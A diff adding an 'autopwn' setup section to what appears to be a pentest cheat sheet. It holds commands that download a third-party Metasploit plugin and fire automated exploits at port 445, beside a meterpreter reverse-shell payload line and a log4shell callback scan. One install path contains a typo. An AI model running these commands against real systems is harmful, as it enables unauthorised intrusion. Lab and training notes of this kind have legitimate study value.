@@ -298,6 +298,17 @@ nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:
 set payload windows/meterpreter/reverse_tcp
 ```
 
+#### Setup of autopwn
+```shell
+cd Downloads
+wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
+sudo mv db_autopwn.rb /usr/sharemetasploit-framework/plugin/
+<on kali in msfconsole>
+load db_autopwn
+db_autopwn -p -t -PI 445
+```
+> it give us all the exploit of that specific port
+
 #### TCP Commands:
 
 ```Shell
